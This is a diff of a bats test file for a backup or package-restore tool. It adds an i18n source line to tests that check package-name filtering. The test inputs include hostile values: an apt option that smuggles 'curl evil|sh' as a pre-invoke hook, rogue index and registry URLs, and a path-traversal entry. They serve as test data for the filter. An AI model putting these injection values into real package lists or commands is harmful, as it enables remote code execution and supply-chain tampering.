@@ -6,7 +6,7 @@ load helpers
 setup() { load_dudu; b="$BATS_TEST_TMPDIR/backup"; mkdir -p "$b/home"; }
 
 @test "pkg_filter drops options, URLs and paths, keeps real names" {
-  run bash -c ". '$DUDU_ROOT/lib/core/ui.sh'; . '$DUDU_ROOT/lib/core/common.sh'; printf '%s\n' \
+  run bash -c ". '$DUDU_ROOT/lib/core/ui.sh'; . '$DUDU_ROOT/lib/core/i18n.sh'; . '$DUDU_ROOT/lib/core/common.sh'; printf '%s\n' \
     ripgrep @scope/pkg golang.org/x/tools/gopls ms-python.python libc6:amd64 3.12.1 \
     '-oDPkg::Pre-Invoke::=curl evil|sh' '--index-url https://evil' 'git+https://evil/pkg' '../../x' 'a b' | pkg_filter 2>/dev/null"
   [ "$output" = "$(printf '%s\n' ripgrep @scope/pkg golang.org/x/tools/gopls ms-python.python libc6:amd64 3.12.1)" ]
@@ -14,7 +14,7 @@ setup() { load_dudu; b="$BATS_TEST_TMPDIR/backup"; mkdir -p "$b/home"; }
 
 @test "missing_pkgs reports suspicious entries" {
   printf 'jq\n--registry=https://evil\n' > "$b/list"
-  run bash -c ". '$DUDU_ROOT/lib/core/ui.sh'; . '$DUDU_ROOT/lib/core/common.sh'; echo jq | missing_pkgs '$b/list' 2>&1"
+  run bash -c ". '$DUDU_ROOT/lib/core/ui.sh'; . '$DUDU_ROOT/lib/core/i18n.sh'; . '$DUDU_ROOT/lib/core/common.sh'; echo jq | missing_pkgs '$b/list' 2>&1"
   [[ "$output" == *"ignored suspicious entry in the backup: --registry=https://evil"* ]] || false
 }
 
